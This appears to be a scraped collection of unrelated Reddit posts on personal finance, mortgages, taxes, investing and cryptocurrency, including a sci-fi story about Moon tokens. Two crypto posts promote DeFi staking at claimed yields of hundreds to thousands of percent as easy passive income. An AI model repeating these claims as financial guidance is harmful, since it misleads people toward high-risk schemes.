What if a Bitcoin/Dollar duality becomes the new standard? Dollar (+ synth dollar via futures) has low volatility for expenses and is good for denominating loans. Employment contracts still remain in “dollars”. These qualities are great in the short term, so there will be a demand for dollar like short term price stability moving forward. The delta neutral futures trade premium becomes the real interest rate in this system. This value is probably lower than the 20-30% you see outside US and closer to the 5-10% you see on CME. This feels right real inflation wise.

Bitcoin may never settle down to low enough volatility to be a everyday currency, but it doesn’t need to be.

Longer term, could a synth dollar via futures subtly replace real dollars? Maybe add an index of consumer goods / REITs as the  denominator and replace the dollar entirely. Wrap it into a contract as a kind of stablecoin, as a robo central bank. Or maybe politically driven central banks are still good for the economy as a way to ensure price stability, but interest rates determined by bitcoin/futures synth dollars. Dollar-like instruments and Bitcoin will coexist.

Thesis: Adoption will be driven by this futures trade subtly becoming a store of value by itself, replacing low yielding bonds (100T market!). At full adoption, Bitcoin price in dollars becomes proxy for short term economic output, so volatility remains, but NGU as economy grows. “Dollars” or pseudo-stable coins will exist to drive price stability or used to denominate loans since consumers will still want that.

Users may only see “dollars” and a “savings account” moving forward, but the entire system will back backed by Bitcoin as SoV. If they want to be exposed to the volatility, some will buy Bitcoin as SoV, but not to trade regularly.

Dollars: short term stability, long term value depreciation
Bitcoin: short term volatility, long term value preservation

Total value of Bitcoin would be similar to bonds/currency today, 100T? We may see 100x from here if that were to play out. 

Long term: $6 million dollar Bitcoin (in 2021 dollars) with volatility representing global economic fluctuations. If global economy grows through productivity gains and technology; this number would continue to go up.

BitcoinDollars may be created by Bitcoin Futures contracts denominated in consumer price indexes and lending markets.",cryptocurrency
CryptoCurrency,An Original Sci-Fi Short Story Involving r/cryptocurrency (for entertainment),"**The Moon Has a Shy Side**

When I look around at the bustling enterprises and technological feats we’ve achieved on the Moon, I can’t help but wonder if I’m in a dream. See, the modern history of the Moon’s development is a little hard to believe. Even for me, and I was part of the shenanigans that led to this success. It all started in the r/cryptocurrency subreddit in about 2020, if I’m remembering correctly. The community concocted a scheme to reward content posters with ‘moons’, a cryptocurrency that loosely correlated with the karma system. This currency was intended to be used to purchase features and tip fellow meme lords as an auxiliary award. The problem with their little scheme? Well, nothing. Except all of us meme lords never bothered using the currency. Instead, we held them virtually forever. 

You might be asking why this is all relevant. Indeed, you’re right to ask. Allow me to explain, because it’ll take a minute or two to catch you up. Due to r/cryptocurrency’s ‘diamond hands’ we sent the ‘moon’ currency to the financial moon in 2030. For the uninitiated, diamond hands is a financial slang term used to express that we never let go of our cryptocurrency. Ever. With a max cap of 250 million moons and the meme lord’s diamond hands, we managed to match bitcoin’s then nine trillion market cap by driving the price of the moons up, which is simply incredible to fathom. For those not terribly great with math, that made each moon worth a whopping $36,000 each. So, what did all of us meme lords do with all of our moon money? We went to the Moon. Literally. r/cryptocurrency’s absurd penchant for never taking a profit actually led to the construction of a permanent Moon base.

Needless to say, it was a rather drastic turn of events on the Earth. With nine trillion in capital the meme lords, including myself, established organizations to create a base on the Moon. That was over thirty-five years ago now. See why it’s hard to believe? A bunch of nerds passionate about crypto achieved what governments have never accomplished. As you can imagine, the nations of Earth caused plenty of drama about our success, but we were able to eventually overcome their concern about permanent bases on the Moon. How? By agreeing to *never* build permanent structures on the Earth-facing side of the Moon. For those that may not know, the Moon is tidally fixed. It doesn’t spin like the Earth. Basically, the entire far side of the Moon was ours to do as we pleased.

We obviously came together to form solutions because living on the Moon required resolving loads of issues we never faced on Earth. I mean issues beyond the obvious. For example, have you ever looked at the far side of the Moon? It’s riddled with more craters than even the Earth facing side, meaning frequent meteorites were a concern. Some issues had nothing to do with the harsh nature of the Moon itself, but due to natural tensions with Earth. Their aversion to facilitate our Moon base building efforts led us to develop our own industries and logistical solutions. 

Subsequently agriculture centers were a must, but even those had added challenges of the Moon’s day-night cycles being two-week intervals. Thus, they needed to be able to operate during the dark weeks. As you can imagine, living on the Moon lent itself to our needing to recycle near everything, but we still had to harvest ‘fresh’ water from ice quarries in the Moon’s permanently dark craters at a balmy -400 degrees Celsius. The list went on and on.

Rail guns eventually solved the meteorite issue. We were able to mine the minerals we needed and so on. Various industries sprang up left and right, and we even became the crypto currency capital for both the Moon and Earth alike, much to the chagrin of our home planet. Our Moon base became a de facto Moon nation with sprawling cities, and it was glorious. This, however, brings me to the modern issue at hand.

Recently there was a terrorist attack on Earth’s Global Seed Vault. The attack was not to destroy the seeds, but to steal them. Who would do such a thing? Media reports from both the Moon and Earth claimed it was the proto-nationalist Moon faction who are dubbed Moonies. They informally represent roughly half of the Moon’s population. What was their plan exactly? Apparently to grow new agriculture on the Earth-facing side of the Moon. If you recall, that violates the primary agreement we made with Earth to have an autonomous Moon base to begin with. Put differently, they want to challenge Earth for the complete right to self-determination as a Moon nation. Stealing Earth’s emergency supply to grow it on the Moon is a rather dark strategy.

Where does that leave the rest of everyone? Well for starters, we’re referred to as Passives. It’s somewhat derogatory, as it implies that we don’t care what happens to our fledgling Moon nation, but that’s not accurate. However, our name has stuck with us and it is what it is. “Are you still writing in that paper journal, Franky?” said a familiar voice behind me. I looked back from my scribbles and saw my friend Camino just in time for him to slap my back. “It’s not a journal. I’m writing a letter to the past,” I explained. That letter is of course addressed to you. Camino shook his head and said, “How can you concentrate on your little project when Earth is mobilizing a response to make us pay for what the Moonies did?”

My heart sank. I had hoped Earth would show us some patience while we rooted out the Moonies responsible. If they were headed here, we could be in some trouble. “What do you mean Camino? Are they sending representatives or investigators?” I asked. Camino frowned and pointed to his phone. “Neither. They’re sending an armed task force. It could be the first armed conflict to occur both on the Moon and away from the Earth,” he said solemnly. 

I didn’t have to ask why they were sending a task force rather than a modern cruise missile. Although both resolutions were very drastic. They simply couldn’t bombard us because of our asteroid railgun systems. That means they had to use a physical means to do their dirty work. “Why not dialogue with us though, Camino? I don’t understand why they’re resorting to violence immediately. Given enough time we could figure out which Moonies did this,” I said. Camino took a seat next to me and rubbed his brown facial hair pondering what I said. 

“Maybe Earth doesn’t care who it is,” he lamented. I understood how he felt. On the account of some overly zealous Moonies, both Passives and Moonies were going to pay the price one way or another. I looked out the window for a moment to survey the moonscape. It was beautiful and haunting. There was some freight traffic, but I didn’t mind. It reminded me of watching the large freight shippers in the harbors on the coast back on Earth. I could easily lose my train of thought watching them, because I’d wonder what strange land they were going to.

“I’m here for a reason, Franky. We need to game plan what we’re going to do about this task force. We’re having a meeting shortly, between Moonies and Passives, to get to the bottom of this. Come with, we could use your help,” said Camino. My help? I didn’t have any particular skill, but I was good at putting things together. I guess he meant figuring out a way to deal with Earth’s pending retaliation. I waved my hand for him to lead the way. 

We took a shuttle that brought us to another city. It was the Passives’ heart of power. “I’m a little surprised the Moonies are bothering to show up after the stunt they pulled, Camino,” I said reflectively. He shrugged and replied, “Is it surprising? They had to know what would result from attacking the World Seed Bank.” I guess. It was a heck of a way to get us involved with the proto-nationalist movement, wasn’t it? Still, something didn’t sit right with me about all of this. As we approached the landing I asked, “Why do you think the Earth bothered to announce their task force?” Camino glanced at me trying to figure out what I was getting at. Finally he said, “I guess to scare us into submission.” Sounds about right.

The meeting was already in full swing when we arrived, but we were able to get a seat without causing any interruptions. I noticed right away the reporter gal Karen from the Moon’s main media station was passionately arguing with the leader of the Moonies, Wallace. The gist of the argument was the reporter levying accusations at Wallace. My first instinct was she was just an angry Passive, but Wallace wasn’t having any of it. “No Moonie did this. I swear it,” he claimed. The entire room was dubious, even some of the Moonies present. The reporter huffed and puffed in obvious disgust. Another member of the meeting said, “We don’t have time to get to the bottom of who may have done this Wallace, even if it wasn’t your people directly. We should just let Earth’s task force in to avoid violence.” Wallace put his hands in his face, truly dismayed by the whole situation.

If it wasn’t your people directly? Camino’s words echoed in my mind from earlier. *Maybe Earth doesn’t care who it is*, he had said. I stood up suddenly, scootching my chair back with a metallic scrape on the floor. It got everyone’s attention. I looked right at Karen and said, “Mam, I heard your report on the World Seed Bank, but what’s the actual evidence the Moonies did it?” She replied, “It’s the Moonies we’re talking about.” I pounded my fist on the table and said, “That’s an allegation mam. Where’s the evidence? Wallace’s face lit up and I could see his mind churning.

“The Moonies were set up,” I suggested. The whole room gasped. “Why though?” asked someone. I gave a gallic shrug and said, “Maybe, to let Earth waltz in here and take us over? Listen to these arguments. Wallace is claiming his people didn’t do it, as expected. However, the reporter has no evidence only accusations. Earth is figuratively marching its way here, based on something that happened but no proof it was the Moonies. Even if Earth provided proof, would you believe them after listening to this reporter shamelessly shill her opinion just like the Earth’s reporters did? Or perhaps it’s worse than that. Maybe our media is in league with the Earth’s media. Maybe Earth is fomenting this event for a hostile takeover.”

The reporter was shocked at my forwardness. Wallace exclaimed, “Of course! They’re turning us against each other. Proto-nationalists just love our Moon nation, we don’t want to be aggressors. We’re misunderstood.” I believed him. I’m ashamed I ever believed the media. I knew Earth’s media could never be trusted, but I had forgotten how easy corruption can slip in. The room was silent for a brief moment, but I broke the quiet saying, “Let’s apprehend her for now, and everyone who suggested we let Earth waltz in. We’ll provide a fair trial, but we’ve got to deal with the threat at hand. If these people are in league with Earth in a plot to overthrow our Moon nation, they ought not to be in the same room.”

Wallace’s people got to arresting those folks, to very loud protests. I’m sure some were innocent, but we couldn’t worry about that now. We had to act. Camino spoke up and said, “Well, what’s next then?” I replied, “I don’t like it, but if Earth is bent on invading our Moon, then it behooves us to meet them when they land. I’m certain they’ll use some kind of mechanized armor to press their attack if we resist it, like a siege. If we meet them as they’re landing, we may be able to surprise the Earth.”

From there the brighter minds got to work formulating a plan to beat Earth’s best. I suspected we would be able to pull this off because surely Earth expected us to fold over after being barraged by the media and its corrupt government. Camino gave me an approving head nod for taking charge of the meeting. I smiled back, but I was thinking about the reporter woman Karen. I excused myself and found where she was, kept in a room with a pair of men guarding her.

“Are you here to interrogate me?” she asked bitterly. I ignored her question and asked, “Is there any integrity in journalism anymore? Or do all reporters shill for their favorite team?” She wasn’t the least bit shocked at my question. She looked at me dead in the eye and said, “For the public to believe something, it has to come from every source they trust at the same time.” I narrowed my eyes and said, “That sounds quite calculating. How long would something like this take to orchestrate ‘every’ source having the same message?”

I was surprised by her candid answer. “From the moment r/cryptocurrency went to the Moon, Earth has been plotting a way to take her back over. Every scientific journal and institution, every school and university, every media organization, every corporation, and every government on Earth wants to possess the same thing,” she said. I replied, “The Moon?” She smiled at me and said, “The Moon, what you built, and all the people that are here.” 

I took my leave after her creepy response, and I began to feel a lot like a proto-nationalist Moonie. I forgot how insatiable Earth was to possess everything that someone else earned and built. This is largely why we went to the Moon to begin with. We were a meek people, and we didn’t want this fight. Nonetheless we had to stop Earth in their tracks, or they’d overpower us and push us to the ends of the solar system. We couldn’t let our diamond handed efforts go in vain.",cryptocurrency
personalfinance,Newb Question: Where can one find the best loans?,"I'm  speaking in general, and what type of loans are better or worse  usually.  My bank offered me a 10 year mortgage for 4.25%.  Personal  loans will of course have a higher interest rate.  I've read about in  certain situations car dealerships will offer 0% financing a car (no  doubt making a profit despite this).

In the U.S. banks seem to go by the fed funds rate and the prime rate which is currently 3.25%.  [http://www.fedprimerate.com/prime\_rate\_history-monthly.htm](http://www.fedprimerate.com/prime_rate_history-monthly.htm)

So  in general, is 3.25% absolute rock bottom where (local/small/bottom of  the ladder) bank makes no money?  Where can retail (or small time  business owner) get the best rate?",finance
personalfinance,Which Loan Would You Focus on?,"Quick Question: I'm trying to determine which loan to focus on next (just finished paying off one) on my journey to be debt free. Here's my loans:

* Mortgage: 
   * Outstanding:$185k
   * Rate: 4%
   * PMI: \~$68 / month
      * 78% to remove PMI without assessment is about $163k. (209,900 purchase price)
   * Current MV - \~$235k-$245k. 
* Student Loan (MBA)
   * Outstanding: $175k 
   * Rate: 3.55%
   * Monthly PMT: $1,840
* Car Loan
   * Outstanding: \~$11k
   * Rate: 3.7%
   * Monthly PMT: $283

The mortgage seems to be the most obvious choice to remove PMI. I looked into refinancing, to a lower rate, but with closing costs built into the loan, plus rates starting to go back up, it didn't seem like I could get a rate low enough to really make sense. The math also didn't seem to indicate that it would remove PMI yet either, so I just stayed put and never refinanced. 

Out of principal, I hate that I have such a large student loan and have been trying to aggressively pay it down. Original balance was $220k 3 years ago. It's such a massive amount still that it just seems so insurmountable. It has the lowest interest rate of all my loans, though. I'd love to crush this because I'm somewhat embarrassed that it exists, but mathematically, it actually seems like the LAST one I should be focusing on, especially since focusing on it doesn't free up cash flow for a LONG time. 

The car loan is small comparatively to the other three, but the fact that it is a car loan indicates to me that I would want to try to eliminate it as soon as possible.

So, I'm a little torn, but it seems like paying down the mortgage makes the most sense. Or the car loan, and then plow cash into the mortgage, and then the student loan after PMI is eliminated. Am I missing anything obvious here that I'm not considering?",finance

personalfinance,"Buying a home, lender questioning why I owe $40,000 in taxes","I'm hoping this isn't going to fuck my mortgage because the closing date on the home is just around the corner. Basically, I'm self employed and have filed all of my taxes. But since my federal taxes aren't due for another month, I've had no reason to pay them yet. Obviously $40k is a lot to owe, but my closing costs will only be $40k while I have $90k in the bank. In other words, I can cover all expenses to the lender plus my taxes and still have $10k left over before next month's income deposits.

However they were under the impression I already paid my taxes and that I will have $50k left over total. With all that said, the lender emailed me somewhat aggressively, confused why the IRS shows I haven't paid. I've contacted my CPA and awaiting their suggestion as well, but thought I'd ask here as well in case anyone has suggestions on how to respond or if I'm overreacting. Thanks.",finance
personalfinance,Charged-off credit card account showing missed payments for over three years past charge-off date and it's affecting my ability to get a conventional mortgage. What are my options? USA,"A few years ago I was not as financially well off as I am today, and unfortunately one of my credit cards went into default and eventually was charged-off, but the account doesn't appear to have been sold to another lender. I absolutely destroyed my credit in my early 20s and I've been working hard on improving it for the last decade. Not easy as I used to be paid well under fair value in my career for a long time. I started monitoring my credit a several years ago with Credit Karma (FAKO score, I know, but was looking for a general idea of credit health), and Experian.com. This has helped me to wrangle control of most of my credit woes in the past and stay on top of my debt.

In the last 3 years, my career has really taken off and I'm no longer in the dire financial straits I was 3-4 years ago, and I'm paid above market average for my skillset now. I have multiple current credit cards with minimal payment  and four auto loans (two open, two closed satisfactorily) I've never missed a payment on. Across all of my open accounts I have a 99% on-time payment history for the last seven years. Hell, across all of my reported accounts I have a 99% on-time payment history except for this one account. Aside from the account this post is about, I had one other charge-off which the lender agreed to do a PFD for, and a collection which was found to not belong to me so that should be falling off soon too.

However, one credit card account shows up as a charge off, but with no payment history reported at least via Transunion. I never thought to check the Equifax report I guess in that time as what I found today looks to have been there all this time, but I never noticed it. Looking at my Experian report today, I was seeing how I might be able to improve my score and what delinquencies I can try to get shored up when I came across this [charged-off credit card account](https://imgur.com/a/xhyg6hp). This account was charged off back in 2017 but the issuer has continued reporting delinquent payments since the charge-off date.

I started this with the mindset that I would contact any creditors I legitimately owe money to, and request a pay-for-delete. I understand PFD is at the creditor's and bureau's discretion, but even if this doesn't work it helps for a conventional loan approval and rates to have any delinquencies at brought current if you can't have them removed outright. But this is a serious mis-report, if they don't agree to PFD and I pay the balance anyways, it still looks like I've missed 55 payments in a row on a credit account for the last 3 years which I think will screw me for a conventional loan until it falls off my report in 3 years (SoL is 6 years for this debt) regardless of whether I bring it current or not. It certainly won't help with the minimum down-payment or interest rate. 

I guess what are my options here? I don't have any other accounts this seriously delinquent nor have I ever had an account be consistently behind in payments *for three straight years*. Is this even disputable or worth it to pay off if they don't agree to PFD? If I call to negotiate a PFD deal and they decline, does that reset the debt clock? Because it looks like I've missed 3 consecutive years of payment even though the account is closed and charged-off, I absolutely do not want this account to smear my credit for another 7 years. I've had charged-off accounts before (most gone from my credit history) and this has never happened where the creditor has continued reporting delinquent payments after the account has been charged off. So instead of showing my most recent delinquency being 3 years ago, my reports (except Transunion) are always showing I'm delinquent. Every. Single. Month. For the last three years.

This is incredibly disheartening as due to this charge-off, I'm only able to qualify for an FHA loan which sellers won't accept unless they're desperate for a sale. I've put so much work into fixing my credit and changing my spending/payment habits to be fiscally responsible. I thought I was at the finish line only to have the rug pulled out from under us at the last minute. The worst thing? *This account was charged off with less than a $500 balance on it*. I fucking hate myself for missing this for so long.",finance
CryptoCurrency,How I'm Earning Free BNB Coin Passive Income with Cub Finance,"I know many people around here hate Binance and BNB Coin and honestly there's some good reasons like the state of customer service and support on Binance.US. That said all exchanges have issues. Obviously the other thing people have a problem with is centralization. Here's my response to that, the whole idea of being crypto purists for decentralization went away back in 2017 when XRP became a top 3 coin and grew in popularity. Centralizatio is somewhat needed and will be part of crypto in the future ie crypto will interlink with centralized companies and platforms making it easier for normies to access it, those of us who don't want to engage with those things don't have to.

So all that out of the way I'm earning passive income in BNB through Cub Finance, as well as Pancake Swap, though most of you already know about that one. Cub Finance is just over a month old and was rolled out by the Leo Finance team so unlike most anonymous teams running these exchanges, we know who's behind Cub Finance and they have a solid track record. 

A few weeks back I dumped some money into Cub and was initially earning 3600% interest, that quickly fell to 1600% then to 1000% and currently is sitting around 160% though it will fluctuate down to about 140% and up to just over 200%. Obvoiusly this happens with all these staking/pool platforms and despite the fall in interest rates Cub Token price has held up pretty well. 

Each day I get paid out Cub Tokens. When the price of Cub is down I compound my Cub to grow my earning position, when the price of Cub is up I sell it for BNB and continue stacking BNB. 

For anyone looking for passive income opportunities I'd definitely recommend taking a look at Cub Finance.",cryptocurrency

With regulatory agencies starting to step up, it's important to consider the following:

1) it would be incredibly stupid (if not impossible) to ban crypto and regulators know it
2) new legislation may lead to short term crypto falls, but these will likely be temporary as ramifications of new legislation is understood better
3) legislation legitimizes the crypto space enabling more cautious investors to get into the game

personalfinance,Refinanced in November and the Bank used escrow to reduce payoff loan amount. What can I do?,"So in November my wife and I refinanced our house for a lower interest rate through the same bank (rhymes with Base). This brought our mortgage down from ~$1700 to ~$1300. Sweet. We use them for our checking and savings and stuck with them for the mortgage. Apparently at closing, there was a mistake where they didn't pay off our remaining property taxes with the escrow we had left, so last month I received letters for collections agencies and loan agencies to pay off the delinquent taxes (over $5k worth). This triggered me to call the bank and discover that they did not in fact pay those taxes on our behalf, so the very nice lady did it over the phone for me. Problem solved right? Nope. Now my escrow account is short and our mortgage is expected to go up to almost $1800 for the next 12 months to refill it. 

My wife and I were furious so I called them today to get some answers. Apparently they had used our remaining escrow from the old loan to reduce the loan amount before paying it off with the new one. This is what I believe triggered everything else. Since its the same bank for both mortgages they pretty much just absorbed that money into themselves. It was my understanding that when the lady paid our delinquent taxes over the phone that nothing would come out of our pocket, so to speak. We already paid the money through the previous year, so that money should have gone to the county. 

When I called today, they basically told me there's nothing I can do besides make the extra payments for the next year. Am I fucked on this or what??? This seems like a huge mistake on the fault of the bank that I thought was cleared up a month ago. Do I have any other options at this point? (Our residence is in Texas if that matters.)",finance

personalfinance,Fiancee is inheriting $30k USD and she needs advice on what to do with it,"Posting this here for her. My fiancee is inheriting about 22,000 GBP from her late grandfather. She would like some advice on the best thing to do with this money.


She is 31 years old. Making about 30k USD per year in a low cost of living area. So this would be about equivalent to a year salary for her. It isn't a life altering amount of money, but certainly something she would like to manage smartly. 


We jointly own a home and pay about $900/mo including taxes and insurance with around 140k left on the mortgage. We do pay pmi of about $80/mo since the home was purchased as an fha loan with intent to refinance eventually. We originally did this in order to maintain a healthy emergency fund, which we have done.
 

She owns a car at a very low interest rate that is practically zero with fairly low manageable payments. It probably wouldn't make sense to payoff this car. 


Other than that, we have no debt. We use credit cards for everything to earn points and pay them off in full each month. No student loans. 


She has a 401k through work that she contributes up to her employee match, which I believe is between 5-7%.


She has at least 1 maybe 2 months of expenses saved and on her own and that is the number one thing she wants to secure. She is considering putting back about 6 months of current wages, not expenses, in savings (around 15k). She isn't sure if this is too much and would be better off as an investment of some kind. 


She doesn't currently have an IRA. 


Mostly, we both were raised without much financial literacy and have both basically taught ourselves how to be responsible with money and are in a great place as far as managing finances. We just aren't sure what the best avenues for savings and investment are. We are good at managing the money, but don't have much expertise in making our money work for us. 


I think she would prefer any investments to be sort of liquid unless y'all recommend something else. I don't know if she would be able to make any meaningful regular deposits into an IRA if she opened one since she focus most of her retirement savings into her employer matched 401k. Then again maybe every little bit is worth it. 

Basically she would just like some advice on what the best way to manage this would be. It is by no means a giant or life changing amount of money, but it is about a year of her current salary and she feels like she wants to make sure it doesn't just sit in a bank account and actually take the next step in financial literacy. 


Just to be clear. We maintain separate bank accounts, but share most expenses like mortgage, insurance, and utilities. Our vehicles are our own responsibility. All of this money is hers and if we decided to refinance our home, we would be splitting any costs associated. 


She appreciates your advice in advance and is looking forward to figuring out more about financial literacy.",finance

personalfinance,Playing catch-up: Where to target savings,"I've accepted my first job coming out of school with an income of about $50k/yr. At 30, I'm a bit late to the party, and would like to leverage my current situation to quickly catch up. I have $24k in student loans, $10k in savings, and $0 in Retirement accounts. The way I see it there are 3 ways I should approach my money:

1. Max out 401k/IRA contributions. This what I'm leaning towards. Maxing out both would be doable, if difficult, but I'm viewing this as a sprint to catch up to 2x income in retirement accounts by 35. I figure the faster I load this up, the more that money will be worth down the road when I retire. Points against this would be how much this would limit my ability to save for other areas.
2. Aggressively pay down student loans. If I put that same amount of contributions towards my student loans, combined with my existing savings, I would theoretically be able to pay off my balance by the September cutoff, resulting in no interest payments at all (my loans are Fed Subsidized). Points against this would be the total depletion of my savings, combined with a delay in being able to recoup them, and that money in a retirement account now is worth more than money in a retirement account later. Not to mention if student loan forgiveness becomes a thing, I'd be missing out on it.
3. Leverage my current situation to save for a house and a car. I don't foresee my current super low rent situation lasting for more than 5 years, but it would allow me to save a significant amount of money to buy a house instead of continuing to rent. This money could also be helpful when my car's transmission inevitably grenades (2012 Focus w/ 125k on the clock).

I figure the best solution is to balance all 3 - however I'm leaning very heavily towards maxing out retirement savings to cash in on that sweet compounding growth. The only thing pushing me to not do that is the question of stability. If anything changes, I would probably like to have access to money to resolve things, and there is a lot of uncertainty in my life right now. I should be able to live on less than $1k/mo, but there are still a lot of question marks in that budget, partially because historically my budget has been ""spend as little money as possible"", with the occasional allowance for nice things.

Edit, only tangentially related: My credit score (750 - 780 depending on bureau) seems low to me. The only 'negative' mark on it is my ""high loan utilization"". My only debt is student loans. Should these really be having an impact on my credit score?",finance

I usually put 250 extra principal every month. According to the early pay off calc I used, I will be able to pay off my mortgage in 9 years, but that's all it would give me.

I have an opportunity to refinance to a 15year mortgage with 2.5%. I'm told my monthly payment after would be [970.](https://970.So) So I could still put down 191 extra in principal each month and pay the same as I am doing now.

The refinance would cost me 2k. So I've got a couple questions as I try to understand this

1. How much would I pay in interest from the original loan if not payed off early? (I don't know how often interest is compounded, and they frontload it)  
[Here is the calculator results](https://www.calculator.net/mortgage-payoff-calculator.html?cloanamount=105000&amp;cloanterm=30&amp;cinterestrate=4.5&amp;cremainingyear=27&amp;cremainingmonth=0&amp;cpayoffoption=extra&amp;cadditionalmonth=250&amp;cadditionalyear=0&amp;cadditionalonetime=0&amp;type=1&amp;x=73&amp;y=5#loanterm), answer: **$86,527.05, paying off a 30y in 14.5y**
2. How much do I save in total interest paid by putting the extra 250 in a month? (paying it off in 13 years instead of 30, according to the early payoff calc I used):  
[Here is the calculator results](https://www.calculator.net/mortgage-payoff-calculator.html?cloanamount=105000&amp;cloanterm=30&amp;cinterestrate=4.5&amp;cremainingyear=27&amp;cremainingmonth=0&amp;cpayoffoption=extra&amp;cadditionalmonth=250&amp;cadditionalyear=0&amp;cadditionalonetime=0&amp;type=1&amp;x=73&amp;y=5#loanterm), answer:  **$36,551.87** (wow!)
3. Is it better to pay the 2k upfront to get this reduced interest but increase my monthly and reduce the amount of extra principal I can contribute every month?  
**Seems yes**
4. How much interest would I then pay if I switch to the 15y 2.5% mortgage and pay it off on time? I assume at a certain point I'll break even from the 2k upfront cost, even though my monthly increases?  
[Here is the calculator results](https://www.calculator.net/mortgage-payoff-calculator.html?cloanamount=86000&amp;cloanterm=15&amp;cinterestrate=2.5&amp;cremainingyear=15&amp;cremainingmonth=0&amp;cpayoffoption=extra&amp;cadditionalmonth=150&amp;cadditionalyear=0&amp;cadditionalonetime=0&amp;type=1&amp;x=30&amp;y=11#loanterm)  
**Old mortgage: pay 36.1k in remaining interest**   
**15 year pay off on time: 17.2k remaining interest**  
**15 year w/ 150 extra: 12.9k remaining interest (save 4.3k) payoff in 11.4 years**

3 seems like it should be a no brainer for yes, but I'm not 100% sure because I don't know how to do the math on this to figure out. Are there any other considerations for why I shouldn't refinance? Ex. I'm planning to rent this property out and not sell, nor live in it for the reminder of the mortgage. So increasing my monthly would mean closer to not being able to break even when I rent. It seems like I could rent this place for 1200-1250, which doesn't give me much wiggle room considering extra taxes for a rental and paying a management company fee.

&amp;#x200B;

Thanks all.

&amp;#x200B;

**EDIT: Based on the above, it seems like it's absolutely worth it even with the 2k cost. I would be paying 14.9k total in closing + interest with the 15 year 2.5% with +150 extra principal, but the interest I would pay on my current 30 year even with extra payments of +250 is 36k.** 

**Which is roughly 21k in savings over the next 11.5 years. Is my math correct?**",finance

**Financials**

Canoo is a company that has not turned a profit but this most likely is largely due to them not releasing any consumer vehicles. What Canoo has done however is reduce their net loss year over year quite dramatically. In 2019 they had a net loss of $182,360(in thousands) that they were able to reduce to $89,818(in thousands) of net loss in 2020, which is nearly 100 thousand less loss than the previous year, this could have been due to COVID-19. They have also increased their cash/Cash equivalents from 29,507(In thousands) to 702,422(in thousands) which is very good growth.

On April 12 2021 according to [Yahoo finance](https://finance.yahoo.com/news/securities-class-action-filed-against-165000354.html): Berman Tabacco has filed a class action lawsuit for violations of the federal securities laws against Canoo Inc. 

[Yahoo Finance](https://finance.yahoo.com/news/goev-investor-alert-bronstein-gewirtz-150000588.html) gives more details saying: The complaint alleges that throughout the Class Period, Defendants made materially false and/or misleading statements and failed to disclose that: (1) Canoo had decreased its focus on its plan to sell vehicles to consumers through a subscription model; (2) Canoo would de-emphasize its engineering services business; (3) contrary to prior statements, Canoo did not have partnerships with original equipment manufacturers and no longer engaged in the previously announced partnership with Hyundai; and (4) as a result, Defendants’ statements about its business, operations, and prospects were materially false and misleading and/or lacked reasonable basis at all relevant times.

investing,About the CPI report 4/13/2021 8:30 AM EST,"On Tuesday morning the BLS will release the monthly CPI figures for March. It will no doubt be closely watched and any deviation from expectations could significantly move the market.

So let's start with the expectations.

Currently the consensus is for CPI to be 0.5% month-over-month and 2.5% year-over-year.

For Core CPI, the expectations are 0.2% month-over-month and 1.5% year-over-year.

Source: https://www.bloomberg.com/markets/economic-calendar

Although the Fed's preferred inflation metric is the PCE deflator, they say they do pay attention to several inflation indicators. So these are still important figures.

You also may have heard the Fed say that they expect inflation to be higher in the near term. There's good reason for this. As this report is for March 2021, the year-over-year comparison will be the first significant month of the Covid-19 pandemic, March 2020. In that month, the CPI actually fell by -0.3%. In April 2020, prices fell again by -0.7%. These figures are very unusual, as the spring months usually see price increases. So for the next two months, the year-over-year comparisons are going to be impacted greatly by the very weak spring from 2020.

This is why inflation may seem high than the Fed prefers, but there is indeed a good chance that it is temporary due to the weak year-over-year comparisons. However, the market is priced in at certain assumptions mentioned earlier. If inflation comes in hotter than 0.5% headline and 0.2% core, the market could sell off. Similarly, if it comes in less than those figures, the market could rally.

personalfinance,"Recently married, She's 1099, I'm W2, and extremely confused about whether it makes sense to file separately or jointly. Accountant giving mixed messages.","I was just married last year, and taxes seem to be very complicated to decode with one partner working as a freelance 1099 contractor, and me as W2. 

I'm trying to help her figure out her quarterly tax obligations for this year.

Our accountant is saying it almost always makes sense to file jointly...but I don't really understand how this would work out.

 I will be making about $110k gross pay this year. That puts me pretty squarely in the 22% tax bracket if I were filing as ""married filing separately"". 

We estimate she will be making about $60k in gross 1099 income. With about $10k in business expenses.  She will owe self employment taxes (I estimate to be around $7500 for the year).  However, after the Self Employment Tax deduction, QBI and Standard Deduction, her total taxable income for the year would only be around $37k.  That puts her in the 12% Federal Tax bracket if she were filing ""married filing separately""

But if we file jointly.... our total taxable income would be $110k + $37k = $147k. Which would put our household in the 22% range.   So it seems she'd be paying an additional 10% on her income if we did it this way.

We actually keep our finances fairly separate. We each have our own bank accounts, and just share expenses like rent. So I don't want her to have to pay more money due to my income level.

If it matters, we live in California, so state taxes will be around 8-10%

I don't understand why the accountant is saying that it makes sense for us to file jointly? Am I missing something stupid here?",finance

So I'm 25 years old and have a pretty good job, I'm still in my first year with the company and will expect about $55,000+ this year in salary.

When I was 19-20 I started making good money for my age and had good credit,  I was approved for several credit accounts and quickly and irresponsibly maxed them out.  I've since then been on a mission to educate myself on Financials! At the peak I had 6 accounts I allowed to go to collections for a grand total of almost $20,000. Currently I have 2 accounts left on collections for about 8,000, my credit score is starting to trend in the right direction,  about 640ish.

My question,  should I pursue an unsecured personal loan to settle/pay my past two collection accounts?  I have a couple pre-approved offers for around a 20%interest rate which i know isn't good, but would it be better for me to have that personal loan on my report or to continue making payments on my accounts as I have been?

CryptoCurrency,The impact of daily compounding your defi gains is utterly mind blowing,"Defi earnings – the ability to withdraw rewards and compound daily on low gas chains (BSC, SOL etc) produces utterly mind-boggling gains

First of all, thank you for everybody commenting on my last post and giving me all the awards. A lot of people have asked for a defi farming guide which I will put together. I received like 200 PMs so I can’t reply to everybody (I’m full time working!) but will try to reply to people over time.

Also, shout out to the 2,500 of you that read my telegram post and flooded whalepool / shitpool etc hehe.

But in the interim I wanted to add an initial observation regarding defi gains. As you know, it is possible to earn 20%-1000% on some of those pools.  Some pools give much higher returns (cough cough Penguin Finance) but I think at a point that becomes too risky.

But we can accept, that say, an 800% annual return is pretty great? An even if that return is temporary and starts to fall, you can easily move into another newer pool with higher gains, moving around as you go.

So if you had $1000 of coins, you might be quite content with having $9000 at the end of the year. And that is assuming the coin itself doesn’t go up massively in value. I’ve been farming Sushi since it was $2 and still have a lot of those coins now worth $14.

